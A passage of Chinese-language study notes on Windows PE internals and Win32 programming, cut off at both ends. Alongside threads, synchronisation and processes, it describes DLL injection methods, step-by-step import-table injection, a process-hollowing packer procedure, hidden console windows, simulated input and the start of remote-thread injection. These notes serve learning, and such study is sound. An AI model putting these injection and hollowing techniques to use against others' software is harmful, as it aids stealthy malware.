}IMAGE_THUNK_DATA32; 在OriginalFirstThunk中的IMAGE_THUNK_DATA32成员。判断最高是否为1，如果是，那么除去最高位的值就是函数的导出序号(按序号导入)；如果不是，那么这个值是一个RVA指向IMAGE_IMPORT_BY_NAME\ntypedef struct_IMAGE_IMPORT_BY_NAME { WORD Hint;\t//可能为空,编译器决定如果不为空是函数在导出表中的索引 BYTE Name[1];\t//函数名称，以0结尾 }IMAGE IMPORT BY NAME, *PIMAGE IMPORT BY NAME; Hint成员如果不为空，则直接找导出表中地址表的索引，直接可以找到函数。\nHint成员如果为空，则通过Name[1]来确定函数叫说明名字，之所以是1字节，是因为函数不知道函数名称的长度，所以确定第一个字节之后一直找，遇到\\x00结束，就是函数的名称。\n确定函数地址：\n在使用其他dll中的函数，使用的call都是间接call。间接call会提供一个地址编号来存放函数的地址，那么这个地址所在的表就是导入地址表(IAT)。 PE文件加载前后IAT表会发生变化，会存放函数的地址(也就是通过函数的名称进而得到函数的地址)。 为什么有两条线？如果IAT表的这条线被破坏，则可以通过INT表进行修正。 绑定导入表 在系统自提供的.exe程序中，可以发现IAT表里面是一个地址，并且和INT表的值不同。这个情况其实可以等价于PE文件加载后的状态，可以提高程序的执行速度。\nPE加载EXE相关的DLL时，首先会根据IMAGE_IMPORT_DESCRIPTOR结构中的TimeDateStamp来判断是否要重新计算IAT表中的地址。\nTimeDateStamp 状态 0 未绑定 1 已绑定（真正的绑定时间为IMAGE_BOUND_IMPORT_DESCRIPTOR的TimeDateStamp） 结构如下：\ntypedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR { DWORD TimeDateStamp; WORD OffsetModuleName; WORD NumberOfModuleForwarderRefs; // Array of zero or more IMAGE_BOUND_FORWARDER_REF follows } IMAGE_BOUND_IMPORT_DESCRIPTOR, *PIMAGE_BOUND_IMPORT_DESCRIPTOR; typedef struct _IMAGE_BOUND_FORWARDER_REF { DWORD TimeDateStamp; WORD OffsetModuleName; WORD Reserved; } IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF; 注意：对应dll的名称是第一个_IMAGE_BOUND_IMPORT_DESCRIPTOR的地址 + 对应的OffsetModuleName\n当IMAGE_BOUND_IMPORT_DESCRIPTOR结构中的TimeDateStamp与DLL文件标准PE头中的TimeDateStamp值不相符时，或者DLL需要重新定位的时候，就会重新计算IAT中的值\n注入入门 当Exe被加载时，系统会根据Exe导入表信息来加载需要用到的DLL，导入表注入的原理就是修改exe导入表，将自己的DLL添加到exe的导入表中，这样exe运行时可以将自己的DLL加载到exe的进程空间。\n注入的种类：\n注册表注入 导入表注入 特洛伊注入 远程线程注入 无DLL注入 Apc注入 Windows挂钩注入DLL 输入法注入 导入表注入的实现步骤：\n根据目录项（第二个就是导入表）得到导入表信息：\ntypedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; //VirtualAddress :指向导入表结构 //Size:导入表的总大小 //这两个值都需要 typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; }; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 新增一个导入表需要的空间： A:20字节 B:16字节\tC:取决于DLL名串的长度+1 D:取决于函数名的长度+1+2 判断哪一个节的空白区 \u003e Size(原导入表的大小) + 20 + A + B + C + D 如果空间不够：可以将C/D 存储在其他的空白区也就是，只要空白区 \u003e Size + 0x20就可以了 如果仍然不够，就需要扩大最后一个节，或者新增节来解决. 将原导入表全部Copy到空白区\n在新的导入表后面，追加一个导入表\n追加8个字节的INT表和 8个字节的IAT表\n追加一个IMAGE_IMPORT_BY_NAME结构，前2个字节是0后面是函数名称字符串\n将IMAGE_IMPORT_BY_NAME结构的RVA赋值给INT和IAT表中的第一项\n分配空间存储DLL名称字符串 并将该字符串的RVA赋值给Name属性\n修正IMAGE_DATA_DIRECTORY结构的VirtualAddress和Size\nwin32 宽字符 概述：\nASCII编码无法满足我们输入的中文文字。便引入了扩展ASCII表，原来的ASCII表进行扩展，将0x80~0xff的两个符号拼起来组成新的文字(GB2312)，就可以显示中文了。但是不同国家有不同的规则，那么中文文字发送过去会产生乱码。为了解决这个问题，就产生了Unicode编码，unicode编码是将世界上所有的字符建立与0~0x10ffff的对应。但是Unicode编码长度可能的1或2或3字节，这样不好存储。\nUTF-16:\nUTF-16编码以16位无符号整数为单位，注意是16位为一个单位，不表示一个字符就只有16位。这个要看字符的Unicode编码处于什么范围而定，有可能是2个字节，也可能是4个字节现在机器上的Unicode编码一般指的就是UTF-16。\nUTF-8:\n不同的16进制码用不同的UTF-8规则编码\nUnicode编码(6进制) UTF-8 字节流(二进制) 000000 - 00007F 0xxxxxxx 000080 - 0007FF 110xxxxx 10xxxxxx 000800 - 00FFFF 1110xxxx 10xxxxxx 10xxxxxx 010000 -10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx BOM（Byte Order Mark）:\n放在UTF-8或UTF-16编码的前面，让计算机知道这是什么方式编码的\nBOM UTF-8 EF BB BF UTF-16LE(小端) FF FE UTF-16BE(大端) FE FF c语言中的宽字节：\nchar szStr[]= \"中国\";\t//2D 4E FD 56 00\t(GB2312编码) wchar_t swzStr]=L\"中国\";\t//D6 D0 B9 FA 00 00\t(Unicode编码)宽字节 注意：宽字符是以00 00为终止符的。\nwin32 api中的宽字节：\n在win32编程中都是见过的类型，只不过是换了一个名字而已。 Windows提供的API凡是需要传递字符串参数的函数，都会提供两个版本和一个宏（比如：MessageboxA MessageboxW），为了使ASCII编码和Unicode编码有区分。 字符类型 字符串指针 char，CHAR PTSTR(LPTSTR)指向多字节字符串 wchar_t，WCHAR PTSTR(LPTSTR)指向宽字符串 宏 TCHAR 宏 PTSTR(LPTSTR) 为字符串指针赋值：\nPSTR pszChar = \"china\";\t//多字节字符 PWSTR pszWChar = L\"china\";\t//宽字符 PTSTR pszTChar = TEXT(\"china\");\t//如果项目是ASCII的，相当于\"china\"；如果项目是UNICODE，相当于L\"china\" 字符数组赋值：\nCHAR cha[] = \"中国\"; WCHAR chw[] = L\"中国\"; TCHAR cht[] = TEXT(\"中国\"); 函数的不同：\n普通 宽字符 功能 printf wprintf 打印到控制台函数 strlen wcslen 获取长度 strcpy wcscpy 字符串复制 strcat wcscat 字符串拼接 strcmp wcscmp 字符串比较 strstr wcsstr 字符串查找 char wchar_t 多字节字符类型 宽字符类型 调试函数：\n//.h void __cdecl OutputDebugStringF(const char *format, ...); #ifdef _DEBUG #define DbgPrintf OutputDebugStringF #else #define DbgPrintf #endif //.cpp void __cdecl OutputDebugStringF(const char *format, ...) { va_list vlArgs; char *strBuffer = (char*)GlobalAlloc(GPTR, 4096); va_start(vlArgs, format); _vsnprintf(strBuffer, 4096 - 1, format, vlArgs); va_end(vlArgs); strcat(strBuffer, \"\\n\"); OutputDebugStringA(strBuffer); GlobalFree(strBuffer); return; } 事件-消息 Windows中的事件是一个“动作”，这个动作可能是用户操作应用程序产生的，也可能是Windows自己产生的。而消息，就是用来描述这些“动作”的，比如：这个动作是什么时候产生的？哪个应用程序产生的？在什么位置产生的？等等……\nWindows为了能够准确的描述这些信息，提供了一个结构体：MSG，该结构体里面记录的事件的详细信息\ntypedef struct tagMSG { HWND hwnd; //表示消息所属的窗口，一个消息一般都是与某个窗口相关联的，在Windows中HWND类型的变量通常用来标识窗口。 UINT message; //在Windows中，消息是由一个数值来表示的，但是由于数值不便于记忆，所以Windows将消息对应的数值定义为WM_XXX宏（WM == Window Message）比如：鼠标左键按下-\u003eWM_LBUTTONDOWN 键盘按下-\u003eWM_KEYDOWN WPARAM wParam; //32位消息的特定附加信息,具体表示什么处决于message LPARAM lParam; //与上一个一样 DWORD time; //消息创建时的时间 POINT pt; //消息创建时的鼠标位置(x轴与y轴) } MSG, *PMSG; 完整的一个消息流程\ngraph TB A[系统/用户触发的某个动作--\u003e事件] --\u003e B[系统将这些信息存储到MSG结构体中--\u003e消息]; B --\u003e C[系统将该消息存储到相关应用程序的消息队列中--\u003e消息队列]; C --\u003e D[循环开始--\u003e从队列中循环获取消息]; D --\u003e H{GetMessage（\u0026Msg,NULL,0,0）?}; H -- 是 (Yes) --\u003e I[TranslateMessage（\u0026Msg）//翻译消息]; I --\u003e J[DispatchMessage（\u0026Msg）//派发消息]; J --\u003e D; H -- 否 (No) --\u003e K[循环结束]; K --\u003e E[DispatchMessage将加工过的消息传递给操作系统]; E --\u003e F[系统调用窗口过程函数]; F --\u003e G{WindowProc函数 //窗口过程函数}; 系统消息队列与应用程序消息队列：\n其实整体的过程就是从消息队列中取出消息，判断消息是不是我关系的消息。如果是就处理消息；如果不是就让系统去处理消息\n子窗口-消息处理函数 按钮事件的处理：\n按钮的WNDCLASS不是我们定义的，是系统预定义好的。\n回调函数的结构\nLRESULT CALLBACK WindowProc( IN HWND hwnd, IN UINT uMsg, IN WPARAM wParam, IN LPARAM lParam ); 回调函数的堆栈\nerDiagram stack { ESP return_address ESP_4 hwnd ESP_8 uMsg ESP_c wParam ESP_10 lParam } 总结：\n按钮是一种特殊的窗体，并不需要提供单独的窗口回调函数\n当按钮有事件产生时，会给父窗口消息处理程序发送一个WM_COMMAND消息\ngraph TB A[按钮] --单击按钮--\u003e B[系统提供WinProc]; B --转换WM_COMMAND--\u003e C[父窗口的WinProc]; 资源表（PE） 资源目录（图中绿色的）：\ntypedef struct _IMAGE_RESOURCE_DIRECTORY { DWORD Characteristics;\t//资源属性 保留 0 DWORD TimeDateStamp;\t//资源创建的时间 WORD MajorVersion;\t//资源版本号 未使用 0 WORD MinorVersion;\t//资源版本号 未使用 0 WORD NumberOfNamedEntries;\t//以名称命名的资源数量 WORD NumberOfIdEntries;\t//以ID命名的资源数量 // IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[]; } IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY; 资源目录项（图中黄色的）：\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY { union {\t//目录项的名称、或者ID struct { DWORD NameOffset:31; //低31位 DWORD NameIsString:1; //最高1位 }; DWORD Name; //在第一层中代表光标，位图等16种预定义类型。而在第二层代表资源编号 WORD Id; }; union { DWORD OffsetToData;\t//目录项指针 struct { DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; }; }; } IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; OffsetToData的含义：\n最高位如果为1：低31位 + 资源地址 == 下一层目录节点的起始位置 最高位如果为0，指向IMAGE_RESOURCE_DATA_ENTRY 第一层、第二层全为1，第三层为0 在Name的union中\n当最高位是1时，低31位是一个UNICODE指针，指向一个结构：\ntypedef struct _IMAGE_RESOURCE_DIR_STRING_U { WORD Length; WCHAR NameString[ 1 ]; } IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U; 当最高位是0时，表示字段的值作为ID使用\n数据项（图中橙色的）：\ntypedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 其中，简体中文：2052\nWM_NOTIFY 概述：\n该消息类型与WM_COMMAND类型相似，都是由子窗口向父窗口发送的消息。 WM_NOTIFY可以包含比WM_COMMAND更丰富的信息。 Windows通用组件中有很多消息，都是通过WM_NOTIFY来描述的。 WM_NOTIFY消息中的参数如下：\nwParam：控件ID\nlParam：指向一个结构：\ntypedef struct tagNMHDR { HWND hwndFrom; //发送通知消息的控制窗口句柄 UINT idFrom; //发送通知消息的控制ID值 UINT code; //通知码，如LVM_SELCHANGED } NMHDR; 这个结构体能满足一般的要求，但能描述的信息还是有限的\n解决方案：对每种不同用途的通知消息都定义另一种结构来表示\ntypedef struct tagNMLVCACHEHINT { NMHDR hdr; int iFrom; int iTo; } NMLVCACHEHINT, *PNMLVCACHEHINT; typedef struct tagLVDISPINFO { NMHDR hdr; LVITEM item; } NMLVDISPINFO, FAR *LPNMLVDISPINFO; typedef struct _NMLVFINDITEM { NMHDR hdr; int iStart; LVFINDINFO lvfi; } NMLVFINDITEM, *PNMLVFINDITEM; 线程 线程是由Windows内核负责创建与管理的，句柄相当于一个令牌，有了这个令牌就可以使用线程对象。\n线程ID是身份证，唯一的，系统进行线程调度的时候要使用的\n创建线程：\nHANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, // 安全属性 通常为NULL SIZE_T dwStackSize, // 参数用于设定线程可以将多少地址空间用于它自己的堆栈，每个线程拥有它自己的堆栈 LPTHREAD_START_ROUTINE lpStartAddress, // 参数用于指明想要新线程执行的线程函数的地址 LPVOID lpParameter, // 线程函数的参数，在线程启动执行时将该参数传递给线程函数。既可以是数字，也可以是指向包含其他信息的一个数据结构的指针 DWORD dwCreationFlags, // 0 创建完毕立即调度 CREATE_SUSPENDED创建后挂起 LPDWORD lpThreadId // 线程ID ); // 返回值：线程句柄 创建线程代码：\nDWORD WINAPI ThreadProc( LPVOID lpParameter // thread data ) //创建一个新的线程 HANDLE hThread = ::CreateThread(NULL, 0, ThreadProc,NULL, 0, NULL); //如果不在其他的地方引用它 关闭句柄 ::CloseHandle(hThread); 向线程函数传递变量的两种方式：\n全局变量 线程参数 线程控制 每个线程在执行的时候，都会独自占用一个CPU，当系统中的线程数量 \u003e CPU的数量时，就会存在多个线程共用一个CPU的情况。但CPU每次只能运行一个线程，Windows每隔20毫秒会进行线程的切换，那比如线程A执行到地址：0x2345678 eax:1 ecx:2 edx:3 ebx:4...还有eflag标志寄存器中的值等等… 此时，线程执行时间到了，被切换到了线程B...当线程B的时间片也到了，再切换会线程A时，系统是如何知道该从哪个地址开始执行呢？被切换前用到的各种寄存器的值该如何恢复呢？\n有一个struct _CONTEXT结构，该结构包含了特定处理器的寄存器数据。\ntypedef struct _CONTEXT { // // The flags values within this flag control the contents of // a CONTEXT record. // // If the context record is used as an input parameter, then // for each portion of the context record controlled by a flag // whose value is set, it is assumed that that portion of the // context record contains valid context. If the context record // is being used to modify a threads context, then only that // portion of the threads context will be modified. // // If the context record is used as an IN OUT parameter to capture // the context of a thread, then only those portions of the thread's // context corresponding to set flags will be returned. // // The context record is never used as an OUT only parameter. // DWORD ContextFlags; // // This section is specified/returned if CONTEXT_DEBUG_REGISTERS is // set in ContextFlags. Note that CONTEXT_DEBUG_REGISTERS is NOT // included in CONTEXT_FULL. // DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_FLOATING_POINT. // FLOATING_SAVE_AREA FloatSave; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_SEGMENTS. // DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_INTEGER. // DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_CONTROL. // DWORD Ebp; DWORD Eip; DWORD SegCs; // MUST BE SANITIZED DWORD EFlags; // MUST BE SANITIZED DWORD Esp; DWORD SegSs; // // This section is specified/returned if the ContextFlags word // contains the flag CONTEXT_EXTENDED_REGISTERS. // The format and contexts are processor specific // BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION]; } CONTEXT; 获取线程CONTEXT结构：\n//挂起线程 SuspendThread(线程句柄); CONTEXT context //设置要获取的类型 context.ContextFlags = CONTEXT_CONTROL; //获取\tBOOL ok = ::GetThreadContext(hThread,\u0026context); //设置 context.Eip = 0x401000; SetThreadContext(hThread,\u0026context);\t函数：\n挂起线程：::SuspendThread(hThread);\n恢复线程：::ResumeThread(hThread);\n终止线程：\n::ExitThread(DWORD dwExitCode);\n线程函数返回\n::TerminateThread(hThread,2);\n::WaitForSingleObject(hThread,INFINITE);\nExitThread与TerminateThread的区别\n::ExitThread(DWORD dwExitCode);是同步调用，就是执行到它就退出，之后的代码就不会执行了；::TerminateThread(hThread,2);是异步调用，后面需要::WaitForSingleObject(hThread,INFINITE);来判断它是否退出了。 ExitThread执行完后释放堆栈，而TerminateThread执行不会释放堆栈。 判断线程是否结束\nBOOL GetExitCodeThread( HANDLE hThread, //要结束的线程句柄 LPDWORD lpExitCode //指定线程的退出代码。可以通过GetExitCodeThread来查看一个线程的退出代码 ); 临界区 多线程访问全局变量产生问题的原因：\n假设有一个公共的白板，上面写着一个数字，比如 “0”。 现在有两个小朋友，小明和小红，他们都想轮流在这个白板上把数字加 1，并且每个人都要加 10000 次。 我们希望最终白板上的数字是 20000。\n小明想加 1： 小明走到白板前，看到上面写着 “0”，心里记住了 “现在是 0”。 小红也想加 1： 几乎同时，小红也走到白板前，也看到了上面写着 “0”，她也记住了 “现在是 0”。 小明写下新数字： 小明心算了一下 0 + 1 = 1，然后拿起笔，把白板上的 “0” 擦掉，写上了 “1”。 小红也写下新数字： 小红也心算了一下 0 + 1 = 1 （注意，她看到的是之前的 “0\"，而不是小明刚写的 “1\"），然后她也拿起笔，把白板上的 “0” （如果还没被擦掉）或者 “1” （如果已经被小明写上了，但是小红没注意到）擦掉，也写上了 “1\"。 总结：\n多线程访问全局变量时，存在线程安全问题（两个人） 局部变量不存在线程安全问题（两个人心算的结果） 临界区的设计思路：\n在上面的例子中，相当于两个人只能用一支笔在白板上写答案\n代码实现：\n//创建CRITICAL_SECTION： CRITICAL_SECTION cs; //在使用前进行初始化 InitializeCriticalSection(\u0026cs);\t//在函数中使用: DWORD WINAPI 线程A(PVOID pvParam) { EnterCriticalSection(\u0026cs); //对全局遍历X的操作 LeaveCriticalSection(\u0026cs); return(0); } DWORD WINAPI 线程B(PVOID pvParam) { EnterCriticalSection(\u0026g_cs); //对全局遍历X的操作 LeaveCriticalSection(\u0026g_cs); return(0); } //删除CRITICAL_SECTION VOID DeleteCriticalSection(PCRITICAL_SECTION pcs); //当线程不再试图访问共享资源时 CRITICAL_SECTION结构\ntypedef struct _RTL_CRITICAL_SECTION { PRTL_CRITICAL_SECTION_DEBUG DebugInfo; LONG LockCount; //它被初始化为数值 -1,此数值等于或大于 0 时，表示此临界区被占用 LONG RecursionCount; //此字段包含所有者线程已经获得该临界区的次数 HANDLE OwningThread; //此字段包含当前占用此临界区的线程的线程标识符,此线程ID与GetCurrentThreadId所返回的 ID 相同 HANDLE LockSemaphore; DWORD SpinCount; } RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; 互斥体 WaitForSingleObject函数：\n等待函数可使线程自愿进入等待状态，直到一个特定的内核对象变为已通知状态为止。\nDWORD WaitForSingleObject( HANDLE hHandle, // 内核对象句柄，可以是进程也可以是线程 DWORD dwMilliseconds // 等待时间，单位是毫秒INFINITE(-1)一直等待 ); //返回值： //WAIT_OBJECT_0(0)\t等待对象变为已通知 //WAIT_TIMEOUT(0x102)\t超时 WaitForMultipleObjects函数：\n同时查看若干个内核对象的已通知状态。\nDWORD WaitForMultipleObjects( DWORD nCount, // 要查看内核对象的数量 CONST HANDLE *lpHandles, // 内核对象数组 BOOL bWaitAll, // 等到类型 TRUE 等到所有变为已通知 FALSE 只要有一个变为已通知 DWORD dwMilliseconds // 超时时间 ); //返回值： //bWaitAll\t为TRUE时，返回WAIT_OBJECT_0(0)代码所以内核对象都变成已通知 //bWaitAll\t为FALSE时，返回最先变成已通知的内核对象在数组中的索引 //WAIT_TIMEOUT(0x102)\t超时 说明：\n内核对象中的每种对象都可以说是处于已通知或未通知的状态之中 这种状态的切换是由Microsoft为每个对象建立的一套规则来决定的 当线程正在运行的时候，线程内核对象处于未通知状态；当线程终止运行的时候，它就变为已通知状态 在内核中就是个BOOL值，运行时FALSE结束TRUE 互斥体与临界区的区别：\n临界区只能用于单个进程间的线程控制 互斥体可以设定等待超时，但临界区不能 线程意外终结时，Mutex可以避免无限等待 Mutex效率没有临界区高 事件 什么是内核对象？\n进程、线程、文件、文件映射、事件、互斥体等等\n事件内核对象的创建\nHANDLE g_hEvent = CreateEvent(NULL, TRUE, FALSE, \"XYZ\"); HANDLE g_hMutex = CreateMutex(NULL,FALSE, \"XYZ\"); 事件内核对象的获取\nHANDLE OpenEvent( DWORD dwDesiredAccess, // access BOOL bInheritHandle, // inheritance option LPCTSTR lpName // object name ); HANDLE g_hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, \"XYZ\"); HANDLE g_hMutex = OpenMutex(MUTEX_ALL_ACCESS,FALSE, \"XYZ\"); 内核对象的销毁\nBOOL CloseHandle(HANDLE hobj); 当没有其他程序引用时，系统会销毁内核对象（使用数量） 内核对象的生命周期，可能比创建它的对象要长 事件\n是在操作系统中可以被程序用来进行事件通知和同步的 “信号灯”（事件对象）\nHANDLE CreateEvent( LPSECURITY_ATTRIBUTES lpEventAttributes, // 安全属性 NULL时为系统默认 BOOL bManualReset, // TRUE 通过调用ResetEvent将事件对象标记为未通知 BOOL bInitialState, // TRUE 已通知状态 FALSE未通知状态 LPCTSTR lpName // 对象名称 以NULL结尾的字符串 ); 事件对象的控制\nBOOL SetEvent(HANDLE hEvent);\t//将对象设置为已通知 关闭时间对象句柄\nCloseHandle();\t//关闭句柄 信号量 创建信号量\nHANDLE CreateSemaphore( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, //表示安全控制，一般直接传入NULL LONG lInitialCount, //表示初始资源数量。0时不发送信号 LONG lMaximumCount, //表示最大并发数量。lInitialCount\u003c=lMaximumCount LPCTSTR lpName //表示信号量的名称，传入NULL表示匿名信号量 ); 打开信号量\nHANDLE OpenSemaphore( DWORD dwDesiredAccess, //表示访问权限，对一般传入SEMAPHORE_ALL_ACCESS BOOL bInheritHandle, //示信号量句柄继承性，一般传入FALSE即可 LPCTSTR lpName //表示名称，不同进程中的各线程可以通过名称来确保它们访问同一个信号量 ); 递增信号量的当前资源计数\nBOOL ReleaseSemaphore( HANDLE hSemaphore, //信号量的句柄 LONG lReleaseCount, //表示增加个数，必须大于0且不超过最大资源数量 LPLONG lpPreviousCount //返回当前资源数量的原始值，设为NULL表示不需要传出 ); //注：没有一个函数可以用来查询信标的当前资源数量的值 进程 就是运行中的一个程序，进程提供程序所需要的资源，它提供数据和代码，是一种空间的概念\n进程内存空间的地址划分：\n分区 x86 32位的windows 空指针赋值区 0x00000000 - 0x0000FFFF 用户模式区 0x00010000 - 0x7FFEFFFF 64KB禁入区 0x7FFF0000 - 0x7FFFFFFF 内核 0x80000000 - 0xFFFFFFFF 进程的创建\ngraph LR A[打开系统] --\u003e B[双击要运行的程序]; B --\u003e C[EXE开始执行]; 任何进程都是别的进程创建的：CreateProcess()\n进程的创建过程\n当系统启动后，创建一个进程：Explorer.exe也就是桌面进程 当用户双击某一个EXE时，Explorer进程使用CreateProcess函数创建被双击的EXE，也就是说，我们在桌面上双击创建的进程都是Explorer进程的子进程 映射EXE文件（将exe放到内存中） 创建内核对象EPROCESS 映射系统DLL（ntdll.dll） 创建线程内核对象ETHREAD 系统启动线程 ​\t映射DLL（ntdll.LdrlnitializeThunk）\n​\t线程开始执行\nCreateProcess的做了什么：\nBOOL CreateProcess( LPCSTR lpApplicationName,\t//对象名称 LPSTR lpCommandLine,\t//命令行 LPSECURITY_ATTRIBUTES lpProcessAttributes,\t//不继承进程句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes,\t//不继承线程句柄 BOOL bInheritHandles,\t//是否允许继承父进程可继承的对象 DWORD dwCreationFlags,\t//没有创建标志 LPVOID lpEnvironment,\t//使用父进程环境变量 LPCSTR lpCurrentDirectory,\t//使用父进程自录作为当前目录，可以自己设置目录 LPSTARTUPINFOA lpStartupInfo,\t//STARTUPINFOW结构体详细信息 LPPROCESS_INFORMATION lpProcessInformation\t//PROCESS_INFORMATION结构体进程信息 )\t创建内核对象\n分配4GB的虚拟空间（Windows 32位）\n将EXE拉伸，存储到指定的位置 遍历EXE导入表，将需要用到的DLL拉伸存储到指定位置，如果位置被占用，换的地方，并通过DLL的重定位表，修复全局遍历 DLL如果引用了其他的DLL，则递归第二步 修复EXE/DLL中的IAT表 创建线程、设置线程CONTEXT开始执行 创建进程的主线程\n当进程的空间创建完毕，EXE与导入表中的DLL都正确加载完毕后，会创建一个线程。\n当线程得到CPU的时候，程序就正开始指向了，EIP的初始值设定为：ImageBase+OEP\nHANDLE CreateThread( PSECURITY_ATTRIBUTES psa, DWORD cbStack, PTHREAD_START_ROUTINE pfnStartAddr, PVOID pvParam, DWORD fdwCreate, PDWORD pdwThreadID); 当进程创建成功后，会将进程句柄、主线程句柄、进程ID以及主线程ID存储在：\ntypedef struct _PROCESS_INFORMATION { HANDLE hProcess;\t//进程句柄 HANDLE hThread;\t//主线程句柄 DWORD dwProcessId;\t//进程ID DWORD dwThreadId;\t//线程ID } PROCESS_INFORMATION; 也就是，CreateProcess的最后一个OUT参数。\n终止进程的三种方式：\n/*1、*/VOID　ExitProcess(UINT fuExitCode)\t//进程自己调用\t/*2、*/BOOL TerminateProcess(HANDLE hProcess, UINT fuExitCode);\t//终止其他进程 /*3、*/ExitThread\t//终止进程中的所有线程，进程也会终止 获取进程的退出码：\nBOOL GetExitCodeProcess(HANDLE hProcess,PDWORD pdwExitCode); 进程终止时相关操作：\n进程中剩余的所有线程全部终止运行 进程指定的所有用户对象均被释放，所有内核对象均被关闭 进程内核对象的状态变成收到通知的状态 进程内核对象的使用计数递减1 句柄表 什么是内核对象：\n像进程、线程、文件、互斥体、事件等在内核都有一个对应的结构体，这些结构体由内核负责管理。我们管这样的对象叫做内核对象。\n一个进程有一个自己的内核对象（EPROCESS），在这一个进程里面还有可能创建其他的内核对象（紫色的），那么如何使用他们呢？可以将对应的内核对象的地址传回去就可以了，但是在用户层访问内核层的问题在于，如果这个内核对象的地址被修改，那么访问对应内核层的地址时就会内存无法访问。所以就产生了句柄表，句柄表是0环EPROCESS下的一个成员（蓝色的），句柄表存在的目的就是解决上面的问题。在句柄表里面会存储进程里面所有内核对象的地址（0环），所以将编号传回去，使用对应的内核对象时用编号来代替对应0环的地址。（相当于防火墙的存在，用户层没办法直接操作内核层）\n注意：\n多个进程可以共享一个内核对象，但是索引值可能不太一样。 有几个进程打开或使用了这个内核对象，内核对象中的计数器就会变为几（紫色里面的红色小下标）。 closehandle的api是让内核对象中的计数器的值减一。 如果想要关闭线程的内核对象，要使计数器的值为0且需要关闭这个线程，两个条件缺一不可。除了线程以外的内核对象只需要使计数器的值为0就可以关闭这个内核对象。（创建对象计数器加一，打开对象加一，关闭对象减一） 关于句柄和ID：\n都是系统分配的一个编号，句柄是客户程序使用ID主要是系统调度时使用。 调用CloseHandle关闭进程或者线程句柄的时候，只是让内核计数器减少一个，并不是终止进程或者线程。进程或线程将继续运行，直到它自己终止运行。 进程ID与线程ID是不可能相同。但不要通过进程或者线程的ID来操作进程或者线程，因为，这个编号是会重复使用的，也就是说，当你通过ID=100这个编号去访问一个进程的时候，它已经结束了，而且系统将这个编号赋给了另外一个进程或者线程。 加密壳 步骤： 读取主模块的数据\n解密：得到原来的PE文件\n以挂起的形式创建进程：CreateProcess，要创建的进程，就是壳子本身！\n获取外壳程序的Context，后面要用\n卸载外壳程序\n在指定的位置分配空间：位置就是src的ImageBase 大小就是Src的SizeOfImage\n如果成功，将Src的PE文件拉伸，复制到该空间中；如果申请空间失败，但有重定位表：在任意位置申请空间，然后将PE文件拉伸、复制、修复重定位表\n如果第6步申请空间失败，并且还没有重定位表，直接返回：失败\n修改外壳程序的Context：\n将Context的ImageBase改成Src的ImageBase\n将Context的OPE改成Src的OEP\n设置Context并恢复主线程\n终止外壳程序，解壳过程结束\n鼠标_窗口 查找指定窗口\nHWND hwnd = ::FindWindow(NULL,TEXT(\"任务管理器\")); 窗口控制\n//切换窗口 SwitchToThisWindow(hwnd,false); //关闭窗口 ::SendMessage(hwnd,WM_CLOSE,0,0); 查找子窗口\nHWND hEdit = FindWindowEx(hwnd,NULL,\"Edit\",\"\"); HWND hEdit =::GetDlgItem(hwnd,0x3E9); 隐藏控制台\n//vs中 #pragma comment(linker,\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\" ) //mingw中 ShowWindow(GetConsoleWindow(), SW_HIDE); 模拟鼠标单击\n::GetWindowRect(hButton,\u0026r); //设置鼠标的位置 ::SetCursorPos(r.left+10,r.top+10); //鼠标左键单击 mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);//点下左键 mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);//松开左键 模拟键盘点击\nkeybd_event(97,0,0,0); keybd_event(97,0,KEYEVENTF_KEYUP,0); Sleep(1000); keybd_event(66,0,0,0); keybd_event(66,0,KEYEVENTF_KEYUP,0); Sleep(1000); keybd_event(16,0,0,0); keybd_event(67,0,0,0); keybd_event(67,0,KEYEVENTF_KEYUP,0); keybd_event(16,0,KEYEVENTF_KEYUP,0); 键盘键与虚拟键码对照表\n远程线程注入 将自己的模块放到别人的进程中。\n如果想在进程（待注入）中执行代码，该如何实现呢？\n创建线程：\nHANDLE WINAPI CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, PDWORD lpThreadId ); 创建远程线程：\nHANDLE WINAPI CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, 